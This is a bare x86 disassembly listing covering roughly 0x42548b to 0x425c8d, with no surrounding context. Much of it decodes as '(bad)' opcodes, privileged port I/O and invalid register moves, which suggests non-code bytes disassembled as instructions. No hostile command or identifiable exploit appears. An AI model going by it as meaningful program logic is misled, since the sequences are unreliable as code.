  42548a:	push   ebx
  42548b:	sub    dh,BYTE PTR [edx-0x8acd646]
  425491:	mov    dl,0x7
  425493:	or     al,0xff
  425495:	mov    dh,0x80
  425497:	lock mov al,BYTE PTR [eax-0x2ac7559]
  42549e:	push   ebx
  42549f:	lods   al,BYTE PTR ds:[esi]
  4254a0:	mov    dl,0xbe
  4254a2:	or     al,0xb2
  4254a4:	mov    ah,0x29
  4254a6:	call   DWORD PTR [ecx]
  4254a8:	xchg   esp,eax
  4254a9:	pop    es
  4254aa:	xor    al,0x87
  4254ad:	and    BYTE PTR [edi+0x53fd5387],0xac
  4254b4:	mov    dl,0xbe
  4254b6:	or     al,0xb2
  4254b8:	mov    ah,0x29
  4254ba:	call   DWORD PTR [ecx]
  4254bc:	push   ebx
  4254bd:	mov    dh,0xc4
  4254bf:	sub    eax,0xbab22a53
  4254c4:	sub    DWORD PTR [ebx-0x9],edx
  4254c7:	mov    dl,0x7
  4254c9:	or     al,0xff
  4254cb:	mov    dh,0x80
  4254cd:	lock mov al,BYTE PTR [eax-0x2ac7559]
  4254d4:	push   ebx
  4254d5:	lods   al,BYTE PTR ds:[esi]
  4254d6:	mov    dl,0xbe
  4254d8:	or     al,0xb2
  4254da:	mov    ah,0x29
  4254dc:	call   DWORD PTR [ecx]
  4254de:	xchg   esp,eax
  4254df:	pop    es
  4254e0:	push   eax
  4254e1:	xchg   edi,eax
  4254e2:	mov    eax,DWORD PTR [eax-0x687f7510]
  4254e8:	mov    dl,BYTE PTR [ebx-0x3]
  4254eb:	push   ebx
  4254ec:	pushf  
  4254ed:	mov    dl,0xbe
  4254ef:	or     al,0xb2
  4254f1:	clc    
  4254f2:	sub    edi,edi
  4254f4:	(bad)  
  4254f5:	in     al,dx
  4254f6:	add    eax,0x80c8f080
  4254fb:	xchg   edi,eax
  4254fc:	enter  0x9c53,0x53
  425500:	std    
  425501:	mov    dl,0xf8
  425503:	sub    DWORD PTR [edx-0x100f342],esi
  425509:	adc    BYTE PTR [edi-0x75587f76],0x53
  425510:	not    DWORD PTR [ebx-0x54]
  425513:	mov    dl,0xb4
  425515:	sub    DWORD PTR [edx-0x6b00f3f9],esi
  42551b:	inc    ebx
  42551c:	(bad)  
  42551d:	arpl   WORD PTR ds:0x4d5b4c09,ax
  425523:	dec    ebp
  425524:	dec    ebp
  425525:	xor    BYTE PTR [edi-0x75],0x80
  425529:	lock out dx,eax
  42552b:	stos   DWORD PTR es:[edi],eax
  42552c:	test   eax,0x77803a50
  425531:	mov    esp,DWORD PTR [ebx-0x72110490]
  425537:	xchg   edi,eax
  425538:	add    BYTE PTR [edi+0x70539696],0x5f
  42553f:	lock and ebp,edx
  425542:	in     eax,0x5f
  425544:	lock out dx,eax
  425546:	(bad)  
  425548:	(bad)  
  425549:	out    dx,al
  42554a:	outs   dx,BYTE PTR ds:[esi]
  42554b:	adc    BYTE PTR [edi+0x9],dh
  42554e:	cld    
  42554f:	ja     0x42551d
  425551:	aad    0xfc
  425553:	ja     0x425562
  425555:	sbb    esp,edi
  425557:	ja     0x4255a6
  425559:	ror    BYTE PTR [ecx],1
  42555b:	loopne 0x4255d4
  42555d:	dec    ebp
  42555e:	or     eax,esp
  425560:	xchg   edi,eax
  425561:	or     eax,0x8d8d7acf
  425566:	lea    esi,[ebx]
  425568:	sti    
  425569:	or     eax,esp
  42556b:	xchg   edi,eax
  42556c:	int3   
  42556d:	xor    edi,ebx
  42556f:	adc    BYTE PTR [edi-0x7b],dh
  425572:	cld    
  425573:	ja     0x42557b
  425575:	or     eax,0xd48a77fc
  42557a:	cld    
  42557b:	ja     0x4255ca
  42557d:	jl     0x42557b
  42557f:	ja     0x42558e
  425581:	sar    esp,cl
  425583:	ja     0x425551
  425585:	push   esp
  425586:	(bad)  
  425587:	ja     0x425555
  425589:	(bad)  
  42558a:	xchg   edi,eax
  42558b:	or     eax,0x978ffba6
  425590:	dec    ebp
  425591:	sar    bl,cl
  425593:	(bad)  
  425594:	xchg   edi,eax
  425595:	mov    cl,BYTE PTR [ebx]
  425597:	pop    es
  425598:	(bad)  
  425599:	xchg   edi,eax
  42559a:	push   es
  42559b:	sar    bl,cl
  42559d:	(bad)  
  42559e:	xchg   edi,eax
  42559f:	test   esi,edx
  4255a1:	neg    ebx
  4255a3:	or     DWORD PTR [ecx],ecx
  4255a5:	loopne 0x42561e
  4255a7:	or     DWORD PTR [edi+0x8],eax
  4255aa:	lea    ecx,[ebp+0x977108d]
  4255b0:	div    eax
  4255b2:	or     DWORD PTR [edi-0x11eff689],ecx
  4255b8:	outs   dx,BYTE PTR ds:[esi]
  4255b9:	xchg   edx,eax
  4255ba:	arpl   ax,si
  4255bc:	out    dx,eax
  4255bd:	in     al,0x50
  4255bf:	dec    ebp
  4255c0:	xlat   BYTE PTR ds:[ebx]
  4255c1:	out    dx,eax
  4255c2:	cdq    
  4255c3:	xchg   BYTE PTR [edx-0x76],cl
  4255c6:	dec    ebp
  4255c7:	dec    ebp
  4255c8:	jo     0x4255c5
  4255ca:	out    dx,eax
  4255cb:	lea    edx,[edi-0x785d7880]
  4255d1:	cmp    eax,0x938d8dee
  4255d6:	cdq    
  4255d7:	mul    BYTE PTR fs:[edi+ebp*2]
  4255db:	cmp    BYTE PTR [eax-0x59],dl
  4255de:	xor    bh,BYTE PTR [edi+esi*2-0x76]
  4255e2:	cmc    
  4255e3:	and    al,0x6f
  4255e5:	cmp    BYTE PTR [edi+esi*2-0x79],bh
  4255e9:	imul   BYTE PTR [edi+ebp*2]
  4255ec:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  4255f0:	xchg   esi,eax
  4255f1:	mov    ch,0xcb
  4255f3:	scas   al,BYTE PTR es:[edi]
  4255f4:	xor    BYTE PTR [edi+0x32],0x80
  4255f8:	lock xor bl,BYTE PTR [ebx-0x2cfef21e]
  4255ff:	cmp    ch,BYTE PTR [ebx+0x2a53fc53]
  425605:	mov    dl,0x86
  425607:	or     al,0xb2
  425609:	mov    edx,0x50b2ff29
  42560e:	ja     0x42559b
  425610:	jl     0x425689
  425612:	sbb    esp,0x24
  425615:	outs   dx,DWORD PTR ds:[esi]
  425616:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  42561a:	inc    edi
  42561b:	sbb    al,0xf9
  42561d:	adc    edi,DWORD PTR [edi+esi*2-0x7c]
  425621:	out    dx,eax
  425622:	lea    ecx,[ebp-0x7f8f7f73]
  425628:	ja     0x4255b4
  42562a:	xor    al,0x8a
  42562d:	push   ebx
  42562e:	sub    dh,BYTE PTR [edx-0x3acd646]
  425634:	mov    dl,0x86
  425636:	or     al,0xff
  425638:	mov    dl,0x80
  42563a:	lock xor al,BYTE PTR [eax+0x51533297]
  425641:	push   ebx
  425642:	pushf  
  425643:	mov    dl,0xbe
  425645:	or     al,0xb2
  425647:	clc    
  425648:	sub    edi,edi
  42564a:	dec    BYTE PTR [ecx]
  42564c:	and    dh,BYTE PTR [edx+0x778092c4]
  425652:	enter  0xf080,0xc8
  425656:	mov    dl,0x86
  425658:	sub    DWORD PTR [edx-0x4d00f346],esi
  42565e:	push   ebx
  42565f:	je     0x4256b1
  425661:	ja     0x4255ee
  425663:	add    DWORD PTR [edi-0x75],esi
  425666:	or     al,BYTE PTR [esi+0x4d4dcc1a]
  42566c:	push   eax
  42566d:	ja     0x4255fa
  42566f:	xor    BYTE PTR [edi-0x75],0x80
  425673:	lock enter 0xf50,0x1
  425678:	add    BYTE PTR [esi],0x4d
  42567b:	dec    ebp
  42567c:	xor    BYTE PTR [edi-0x76],0x80
  425680:	lock mov dl,BYTE PTR [ebx-0x4]
  425684:	push   ebx
  425685:	sub    dh,BYTE PTR [edx-0x454df37a]
  42568b:	sub    edi,edi
  42568d:	mov    dl,0xec
  42568f:	ja     0x425659
  425691:	push   eax
  425692:	ja     0x42565c
  425694:	xor    BYTE PTR [edi-0x79],0x80
  425698:	lock xchg DWORD PTR [ebx+0x2a],edx
  42569c:	mov    dl,0xba
  42569e:	sub    DWORD PTR [ebx-0x4],edx
  4256a1:	mov    dl,0x86
  4256a3:	or     al,0xff
  4256a5:	mov    dl,0x80
  4256a7:	lock mov al,BYTE PTR [eax+0x51538a97]
  4256ae:	push   ebx
  4256af:	pushf  
  4256b0:	mov    dl,0xbe
  4256b2:	or     al,0xb2
  4256b4:	clc    
  4256b5:	sub    edi,edi
  4256b7:	inc    BYTE PTR [ebx-0x4e]
  4256ba:	xor    al,0xc8
  4256bd:	arpl   bp,di
  4256bf:	fstp   DWORD PTR [edx]
  4256c1:	xor    BYTE PTR [edi-0x7],0x80
  4256c5:	lock stc 
  4256c7:	push   ebx
  4256c8:	cld    
  4256c9:	push   ebx
  4256ca:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256d0:	sub    edi,edi
  4256d2:	mov    dl,0x50
  4256d4:	ja     0x425661
  4256d6:	jl     0x42574f
  4256d8:	xchg   DWORD PTR [edx-0x7fc790e2],ebp
  4256de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256df:	mov    esi,0x8d8d8dcd
  4256e4:	xor    al,0x83
  4256e7:	xor    BYTE PTR [edi-0x7d],0x53
  4256eb:	jl     0x42569f
  4256ed:	test   BYTE PTR [ecx],ch
  4256ef:	push   ebx
  4256f0:	push   ecx
  4256f1:	mov    dl,0xbe
  4256f3:	or     al,0xff
  4256f5:	std    
  4256f6:	xor    BYTE PTR [edi-0x75],0x94
  4256fa:	xchg   BYTE PTR [eax+0x77],dl
  4256fd:	add    BYTE PTR [eax-0x72701089],0x10
  425704:	ja     0x4256ca
  425706:	(bad)  
  425707:	ja     0x4256cd
  425709:	xor    al,0x8b
  42570c:	or     eax,esp
  42570e:	push   0x53
  425710:	mov    dl,0x50
  425712:	ja     0x4256dc
  425714:	xor    BYTE PTR [edi-0x79],0x80
  425718:	lock xchg DWORD PTR [ebx-0x4],edx
  42571c:	mov    dl,0x86
  42571e:	or     al,0x53
  425720:	sub    dh,BYTE PTR [edx-0x4d00d646]
  425726:	xor    al,0xc8
  425729:	xor    esi,DWORD PTR [edx-0x7db0f080]
  42572f:	push   es
  425730:	dec    ebp
  425731:	dec    ebp
  425732:	xor    al,0x82
  425735:	push   ebx
  425736:	mov    dl,0x50
  425738:	ja     0x4256c5
  42573a:	xor    BYTE PTR [edi-0x76],0x80
  42573e:	lock mov dl,BYTE PTR [ebx-0x4]
  425742:	push   ebx
  425743:	sub    dh,BYTE PTR [edx-0x454df37a]
  425749:	sub    edi,edi
  42574b:	mov    dl,0x3a
  42574d:	ja     0x42573e
  42574f:	xor    BYTE PTR [edi-0x76],0x80
  425753:	lock mov dl,BYTE PTR [ebx-0x4]
  425757:	push   ebx
  425758:	sub    dh,BYTE PTR [edx-0x454df37a]
  42575e:	sub    edi,edi
  425760:	mov    dl,0x3f
  425762:	ja     0x4256e8
  425764:	xor    BYTE PTR [edi+0x32],0x80
  425768:	lock xor dl,BYTE PTR [ebx+0x2a]
  42576c:	push   ebx
  42576d:	cld    
  42576e:	mov    dl,0xba
  425770:	sub    DWORD PTR [edx-0x4d00f37a],esi
  425776:	xor    al,0x84
  425779:	arpl   bp,di
  42577b:	or     DWORD PTR [edi-0x4d],ecx
  42577e:	dec    ebp
  42577f:	dec    ebp
  425780:	dec    ebp
  425781:	xor    BYTE PTR [edi-0x7],0x80
  425785:	lock stc 
  425787:	push   ebx
  425788:	cld    
  425789:	push   ebx
  42578a:	sub    dh,BYTE PTR [edx-0x794dd646]
  425790:	or     al,0xab
  425792:	push   DWORD PTR [edx-0x56740f80]
  425798:	push   ebx
  425799:	mov    dl,0xa3
  42579b:	jo     0x425798
  42579d:	out    dx,al
  42579e:	lea    edx,[edi-0x78127880]
  4257a4:	jno    0x4257f9
  4257a6:	jo     0x42573b
  4257a8:	fwait
  4257a9:	pop    edi
  4257aa:	lock out dx,eax
  4257ac:	or     DWORD PTR [edi],ecx
  4257ae:	pop    esp
  4257af:	lea    ecx,[ebp+0x905638d]
  4257b5:	mov    cr1,ebp
  4257b8:	lea    ecx,[ebp+0x2d995c09]
  4257be:	pop    esi
  4257bf:	and    al,0x38
  4257c1:	lea    ecx,[ebp+0x508af050]
  4257c7:	lock xor dl,BYTE PTR [ebx-0x9]
  4257cb:	push   eax
  4257cc:	lock mov edi,DWORD PTR [ecx-0x49460180]
  4257d3:	jo     0x425828
  4257d5:	dec    ebp
  4257d6:	jl     0x42584f
  4257d8:	enter  0x4d07,0x4d
  4257dc:	dec    ebp
  4257dd:	mov    ecx,0xc5d3cb63
  4257e2:	mov    ecx,0xb98ae780
  4257e7:	mov    dh,0x7c
  4257e9:	mov    ecx,0x5c098b53
  4257ee:	lock mov eax,DWORD PTR [ecx]
  4257f1:	and    esp,ebx
  4257f3:	mov    ecx,0xd70cdf5f
  4257f8:	pop    ebx
  4257f9:	or     DWORD PTR [eax+esi*1+0x50],ebx
  4257fd:	lock enter 0x63b9,0xfd
  425802:	xlat   BYTE PTR ds:[ebx]
  425803:	iret   
  425804:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425808:	and    BYTE PTR [edi+0x1f65cdef],0x8d
  42580f:	aad    0x53
  425811:	or     DWORD PTR [eax+esi*8-0x76],ebx
  425815:	and    BYTE PTR [edi-0x5f64611],0x21
  42581c:	pop    ds
  42581d:	mov    ecx,0x53b9b2b6
  425822:	std    
  425823:	mov    ecx,0xd5c8f05f
  425828:	and    edi,DWORD PTR [edi+esi*2-0x38]
  42582c:	xchg   BYTE PTR [ebp+0x4d],cl
  42582f:	dec    ebp
  425830:	dec    ebp
  425831:	ja     0x4257be
  425833:	cmp    ch,0xb9
  425836:	push   ebx
  425837:	mov    cl,0x2d
  425839:	mov    ecx,0x5fb970b6
  42583e:	lock mov esp,esp
  425841:	cmc    
  425842:	les    esp,FWORD PTR [esi+0x7c32774d]
  425848:	ja     0x425812
  42584a:	mov    esi,0x94d4d4d
  42584f:	pop    esp
  425850:	out    0x8a,eax
  425852:	and    BYTE PTR [edi+0x5d7053ef],0x21
  425859:	sub    edx,ebp
  42585b:	pop    ss
  42585c:	dec    ebp
  42585d:	ja     0x4257e9
  42585f:	in     eax,dx
  425860:	out    0xc8,eax
  425862:	xchg   BYTE PTR [ecx],cl
  425864:	dec    edi
  425865:	ror    BYTE PTR [ebp+0x4d],1
  425868:	dec    ebp
  425869:	push   ebx
  42586a:	push   0xffffffab
  42586c:	mov    ds:0x8deefb70,eax
  425871:	xor    al,0x32
  425874:	mov    ecx,0x53b9b2b6
  425879:	std    
  42587a:	push   ebx
  42587b:	push   0xffffffb9
  42587d:	arpl   WORD PTR [ecx+0x6a16092d],si
  425883:	les    eax,FWORD PTR [edx]
  425885:	xchg   edi,eax
  425886:	add    BYTE PTR [edi-0x6c427813],0x99
  42588d:	fwait
  42588e:	loop   0x4258d5
  425890:	dec    ebp
  425891:	xlat   BYTE PTR ds:[ebx]
  425892:	out    dx,eax
  425893:	xor    BYTE PTR [edx],0x86
  425896:	inc    ebx
  425897:	mov    ecx,DWORD PTR [ebp+0x4d]
  42589a:	add    DWORD PTR [ecx-0x40],edi
  42589d:	push   eax
  42589e:	ja     0x4258c6
  4258a0:	add    DWORD PTR [ecx+0x75],edi
  4258a3:	push   eax
  4258a4:	ja     0x4258d4
  4258a6:	add    DWORD PTR [ecx-0x47],edi
  4258a9:	push   eax
  4258aa:	ja     0x4258e2
  4258ac:	add    DWORD PTR [eax+edx*1-0x73],ecx
  4258b0:	lea    ecx,[ebp+0x13e7750]
  4258b6:	dec    esp
  4258b7:	cmc    
  4258b8:	lea    ecx,[ebp+0x4677508d]
  4258be:	add    DWORD PTR [edi+ebp*4-0x73],ecx
  4258c2:	lea    ecx,[ebp+0x1627750]
  4258c8:	dec    esp
  4258c9:	mov    BYTE PTR [ebp+0x77508d8d],cl
  4258cf:	push   esi
  4258d0:	add    DWORD PTR [ecx+esi*2+0x3a],ecx
  4258d4:	lea    ecx,[ebp+0x15e7750]
  4258da:	dec    esp
  4258db:	aam    0x3a
  4258dd:	lea    ecx,[ebp+0x50667750]
  4258e3:	xlat   BYTE PTR ds:[ebx]
  4258e4:	push   ds
  4258e5:	add    DWORD PTR [ebp+edx*4+0x3a],ecx
  4258e9:	lea    ecx,[ebp-0x7f9588b0]
  4258ef:	dec    esp
  4258f0:	cmp    cl,BYTE PTR ds:[ebp+0x5381808d]
  4258f7:	jb     0x425949
  4258f9:	xchg   edi,eax
  4258fa:	not    DWORD PTR [eax-0x69]
  4258fd:	jp     0x42594f
  4258ff:	xchg   edi,eax
  425900:	adc    BYTE PTR [eax-0x69],0x83
  425904:	jl     0x42597d
  425906:	std    
  425907:	(bad)  [esi-0x79a1ee21]
  42590d:	pop    DWORD PTR [ebx+0x26]
  425910:	push   eax
  425911:	ja     0x4258c2
  425913:	xor    al,0xfd
  425916:	and    bh,0xaf
  425919:	push   ebx
  42591a:	mov    esp,DWORD PTR [edx-0x20a724fb]
  425920:	adc    DWORD PTR [ecx],ecx
  425922:	inc    esi
  425923:	retf   
  425924:	or     al,0xb2
  425926:	popa   
  425927:	or     al,0x50
  425929:	out    0xf9,eax
  42592b:	and    bh,0xfd
  42592e:	and    BYTE PTR [edi+0x53ac80af],0x4d
  425935:	push   ebx
  425936:	test   DWORD PTR [edx+0x2aff29b4],esi
  42593c:	and    bh,0xf9
  42593f:	icebp  
  425940:	lea    ecx,[ebp+0x353cd8d]
  425946:	inc    DWORD PTR [esi]
  425948:	jmp    FWORD PTR [edx]
  42594a:	push   eax
  42594b:	xlat   BYTE PTR ds:[ebx]
  42594c:	mov    ecx,DWORD PTR [ecx]
  42594e:	(bad)  
  425950:	lea    ecx,[ebp-0x8885d73]
  425956:	rcr    ebp,0x86
  425959:	outs   dx,DWORD PTR ds:[esi]
  42595a:	pusha  
  42595b:	mov    esi,0xe26438f
  425960:	lock jp 0x425905
  425963:	ja     0x4258e7
  425965:	rcr    ebp,0x52
  425968:	or     al,0xe
  42596a:	lock add DWORD PTR [eax-0x287f0210],0xffffffaf
  425972:	and    bh,0xfd
  425975:	and    BYTE PTR [edi-0x5dcdac51],0x5
  42597c:	fistp  DWORD PTR [eax-0x21]
  42597f:	adc    DWORD PTR [ecx],ecx
  425981:	inc    esi
  425982:	add    eax,0x29bcb20c
  425987:	mov    dl,0x88
  425989:	or     al,0x53
  42598b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42598c:	push   ebx
  42598d:	test   edi,edi
  42598f:	adc    edi,edi
  425991:	dec    ebx
  425992:	in     eax,dx
  425993:	mov    dl,0x4d
  425995:	in     eax,dx
  425996:	jle    0x4259e5
  425998:	push   eax
  425999:	lock std 
  42599b:	push   eax
  42599c:	xlat   BYTE PTR ds:[ebx]
  42599d:	scas   eax,DWORD PTR es:[edi]
  42599e:	xor    al,0xf7
  4259a1:	push   eax
  4259a3:	jp     0x42597a
  4259a5:	and    esp,DWORD PTR [edx+0x36ff777]
  4259ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259ac:	retf   
  4259ad:	pusha  
  4259ae:	sbb    edi,edx
  4259b0:	jp     0x425965
  4259b2:	push   cs
  4259b3:	lock jp 0x425958
  4259b6:	ja     0x42593a
  4259b8:	sti    
  4259b9:	jl     0x425997
  4259bb:	int3   
  4259bc:	push   cs
  4259bd:	lock add esp,0x1d
  4259c1:	mov    ds:0xddc1f7f0,al
  4259c6:	xchg   BYTE PTR [ecx+0x30],bh
  4259c9:	ja     0x425a45
  4259cb:	mov    ds:0xddc182b7,al
  4259d0:	push   edx
  4259d1:	jmp    0x438f:0xbe83b7a2
  4259d8:	es xor al,0xfd
  4259dc:	xor    al,0xaf
  4259df:	and    bh,0xfd
  4259e2:	and    BYTE PTR [edi+0x63609af],0xc
  4259e9:	mov    dl,0xbe
  4259eb:	sub    DWORD PTR [ebx+0xb],edx
  4259ee:	inc    esi
  4259f0:	mov    dl,0xbc
  4259f2:	or     al,0xff
  4259f4:	sub    ah,BYTE PTR [edx-0x20a726fb]
  4259fa:	adc    DWORD PTR [eax-0x10],edx
  4259fd:	std    
  4259fe:	push   ebx
  4259ff:	xor    dl,BYTE PTR [eax-0x29]
  425a02:	scas   eax,DWORD PTR es:[edi]
  425a03:	xor    al,0xfd
  425a06:	adc    bh,0xaf
  425a09:	and    bh,0xfd
  425a0c:	and    BYTE PTR [edi-0x5dcdac51],0x5
  425a13:	fistp  DWORD PTR [eax-0x21]
  425a16:	adc    DWORD PTR [ecx],ecx
  425a18:	inc    esi
  425a19:	add    eax,0x29bcb20c
  425a1e:	mov    dl,0x88
  425a20:	or     al,0x53
  425a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a23:	push   ebx
  425a24:	test   edi,edi
  425a26:	adc    edi,edi
  425a28:	dec    ebx
  425a29:	call   DWORD PTR [ecx+0x9]
  425a2c:	dec    edi
  425a2d:	ror    BYTE PTR [ebp+0x4d],0x4d
  425a31:	adc    bh,0x8b
  425a34:	dec    edi
  425a35:	or     ecx,DWORD PTR [ecx]
  425a37:	mov    cr1,ebp
  425a3a:	lea    ecx,[ebp-0x7f9a8680]
  425a40:	in     eax,0x81
  425a42:	fucomp st(4)
  425a44:	or     eax,0x80359b80
  425a49:	leave  
  425a4a:	and    eax,0x802d7b80
  425a4f:	stos   DWORD PTR es:[edi],eax
  425a50:	sbb    eax,0x97507eec
  425a55:	scas   eax,DWORD PTR es:[edi]
  425a56:	sbb    BYTE PTR [ebx-0x13ae13eb],0xfc
  425a5d:	push   eax
  425a5e:	lock xchg DWORD PTR [eax+0x77],edx
  425a62:	jp     0x425ab4
  425a64:	xchg   edi,eax
  425a65:	enter  0x9463,0xdb
  425a69:	in     al,dx
  425a6a:	push   eax
  425a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a6c:	enter  0x7253,0x50
  425a70:	xchg   edi,eax
  425a71:	sbb    DWORD PTR [edi-0x69],0xffffffc8
  425a75:	(bad)  
  425a77:	(bad)  
  425a78:	in     al,dx
  425a79:	xor    BYTE PTR [edi+0x7a],0x80
  425a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a7e:	scas   eax,DWORD PTR es:[edi]
  425a7f:	or     DWORD PTR [ebp+eiz*1-0x6d],ebx
  425a83:	arpl   WORD PTR [ebx+0x63b3d31d],bx
  425a89:	stos   DWORD PTR es:[edi],eax
  425a8a:	adc    eax,0xee80a9d3
  425a8f:	pop    edx
  425a90:	adc    BYTE PTR [edi+0x202580ef],0x50
  425a97:	xchg   edi,eax
  425a98:	mov    ch,ah
  425a9a:	cld    
  425a9b:	add    DWORD PTR [edi+0x4304ec1e],edx
  425aa1:	xchg   edi,eax
  425aa2:	out    dx,eax
  425aa3:	push   eax
  425aa4:	ja     0x425ad8
  425aa6:	push   eax
  425aa7:	xchg   edi,eax
  425aa8:	jbe    0x425b26
  425aaa:	ja     0x425aa5
  425aac:	dec    DWORD PTR [ebp-0x687f7273]
  425ab2:	mov    ch,ch
  425ab4:	(bad)  
  425ab5:	(bad)  
  425ab6:	xlat   BYTE PTR ds:[ebx]
  425ab7:	sub    DWORD PTR [edx],ecx
  425ab9:	xor    BYTE PTR [edi+0x76],0x80
  425abd:	push   ebp
  425abe:	jno    0x425a46
  425ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ac1:	mov    cl,BYTE PTR [ebp+0x4d]
  425ac4:	adc    bh,0x8b
  425ac7:	xor    al,0x87
  425aca:	dec    edi
  425acb:	push   0xffffffd5
  425acd:	das    
  425ace:	xor    BYTE PTR [edi-0x76],0x50
  425ad2:	sbb    eax,0xed327780
  425ad7:	ja     0x425a63
  425ad9:	out    dx,al
  425ada:	dec    ebp
  425adb:	lock stc 
  425add:	xlat   BYTE PTR ds:[ebx]
  425ade:	mov    dh,0x80
  425ae0:	xchg   edi,eax
  425ae1:	sbb    eax,0x50
  425ae4:	xchg   edi,eax
  425ae5:	and    DWORD PTR [ebx-0x69],0xffffffc8
  425ae9:	in     al,0xdc
  425aeb:	stos   DWORD PTR es:[edi],eax
  425aec:	cmp    ah,0xa9
  425aef:	mov    ds:0x8deefb70,eax
  425af4:	xchg   edi,eax
  425af5:	add    BYTE PTR [edi-0x10287f67],0x4d
  425afc:	loopne 0x425b30
  425afe:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  425b04:	xchg   ch,ah
  425b06:	int3   
  425b07:	dec    ebp
  425b08:	dec    ebp
  425b09:	or     BYTE PTR [esi+edi*1+0x3a],0x8d
  425b0e:	lea    edx,[ebx+0x70]
  425b11:	pop    edi
  425b12:	out    dx,eax
  425b13:	test   eax,0x80b21809
  425b18:	mov    dl,0xa7
  425b1a:	sti    
  425b1b:	out    dx,al
  425b1c:	lea    eax,[eax-0x72c5e1e4]
  425b22:	lea    edx,[ebx+0x5e328099]
  425b28:	and    al,0x38
  425b2a:	lea    ecx,[ebp-0x2ac5e3c]
  425b30:	mov    ecx,0x50b970b6
  425b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b36:	in     eax,dx
  425b37:	sti    
  425b38:	or     al,0xed
  425b3a:	cld    
  425b3b:	or     al,0x9
  425b3d:	pop    esp
  425b3e:	mov    eax,ds:0xd7fd63b9
  425b43:	pop    es
  425b44:	push   ebx
  425b45:	push   0xffffffa9
  425b47:	mov    ecx,0xce800c50
  425b4c:	push   ds
  425b4d:	cmp    cl,BYTE PTR [ebp-0x648b5c73]
  425b53:	or     BYTE PTR [ebx+0x3a1e4c80],0x8d
  425b5a:	lea    esi,[edx+0x7cec6fbc]
  425b60:	les    esp,FWORD PTR [esi-0x3232fa33]
  425b66:	mov    esi,0x6def10bd
  425b6b:	fmul   DWORD PTR [edi-0x7934325a]
  425b71:	xlat   BYTE PTR ds:[ebx]
  425b72:	popa   
  425b73:	cld    
  425b74:	lea    ecx,[ebp+0x3a1e4c80]
  425b7a:	lea    ecx,[ebp+0x74ab7cec]
  425b80:	xchg   edi,eax
  425b81:	add    BYTE PTR [edi-0x72a5785e],0x8d
  425b88:	lea    edx,[ebx+0x438f8660]
  425b8e:	es cdq 
  425b90:	fwait
  425b91:	jl     0x425c0a
  425b93:	enter  0x58e4,0xdf
  425b97:	adc    DWORD PTR [eax-0x10],edx
  425b9a:	mov    edi,DWORD PTR [edi+esi*2-0x79]
  425b9e:	fstp   DWORD PTR [eax-0x21]
  425ba1:	adc    DWORD PTR [eax-0x10],edx
  425ba4:	xor    dl,BYTE PTR [ebx+0x6a]
  425ba7:	jl     0x425c20
  425ba9:	xchg   dh,dh
  425bab:	and    al,0x6f
  425bad:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  425bb1:	cmc    
  425bb2:	and    al,0x6f
  425bb4:	cmp    BYTE PTR [edi+esi*2-0x9],bh
  425bb8:	call   0x50543b15
  425bbd:	lock jp 0x425c3c
  425bc0:	ja     0x425c20
  425bc2:	out    0x58,al
  425bc4:	fist   WORD PTR [ecx]
  425bc6:	push   eax
  425bc7:	lock data16 xor BYTE PTR [edi-0x79],0x80
  425bcd:	xchg   edi,eax
  425bce:	xor    cl,BYTE PTR [ecx]
  425bd0:	inc    esi
  425bd1:	test   DWORD PTR [edx+esi*4],0x97800c07
  425bd8:	xchg   DWORD PTR [eax-0x74dcd29],eax
  425bde:	sub    DWORD PTR [edi+eiz*4-0x39],ebp
  425be2:	add    al,0xd4
  425be4:	push   ebx
  425be5:	jl     0x425c3a
  425be7:	or     edi,edi
  425be9:	cld    
  425bea:	push   eax
  425beb:	ja     0x425b70
  425bed:	add    DWORD PTR [edi-0x7c],esi
  425bf0:	push   eax
  425bf1:	ja     0x425ba2
  425bf3:	xor    BYTE PTR [edi-0x51],0xfa
  425bf7:	and    ah,BYTE PTR [edi+ebp*2]
  425bfa:	cmp    BYTE PTR [ebp+ecx*4-0x47],bh
  425bfe:	pop    eax
  425bff:	fist   WORD PTR [ecx]
  425c01:	push   eax
  425c02:	jge    0x425bf2
  425c04:	xor    al,0x8a
  425c07:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  425c0e:	or     al,0xe2
  425c10:	or     eax,0xb2f7539d
  425c15:	clc    
  425c16:	sub    edi,edi
  425c18:	inc    BYTE PTR [eax-0x587f7569]
  425c1e:	mov    dl,BYTE PTR [ebx+0x7e]
  425c21:	mov    dl,0x7
  425c23:	or     al,0x53
  425c25:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c2c:	inc    BYTE PTR [eax-0x587f7569]
  425c32:	mov    dl,BYTE PTR [ebx+0x7e]
  425c35:	mov    dl,0x7
  425c37:	or     al,0x53
  425c39:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c40:	inc    BYTE PTR [eax-0x587f7569]
  425c46:	mov    dl,BYTE PTR [ebx+0x7e]
  425c49:	mov    dl,0x7
  425c4b:	or     al,0x53
  425c4d:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425c54:	(bad)  
  425c55:	push   eax
  425c56:	add    DWORD PTR [edx+0x4d],edx
  425c59:	dec    ebp
  425c5a:	dec    ebp
  425c5b:	xor    al,0x86
  425c5e:	adc    BYTE PTR [edi+0x53f75386],0x51
  425c65:	mov    dl,0xf8
  425c67:	sub    DWORD PTR [edx-0x100f342],esi
  425c6d:	adc    BYTE PTR [edi-0x79587f7a],0x53
  425c74:	jle    0x425cc9
  425c76:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  425c7d:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c84:	dec    ebp
  425c85:	dec    ebp
  425c86:	xor    al,0x21
  425c89:	xor    BYTE PTR [eax],0x80
  425c8c:	xchg   edi,eax
  425c8d:	mov    al,BYTE PTR [eax+0x7f808aa7]
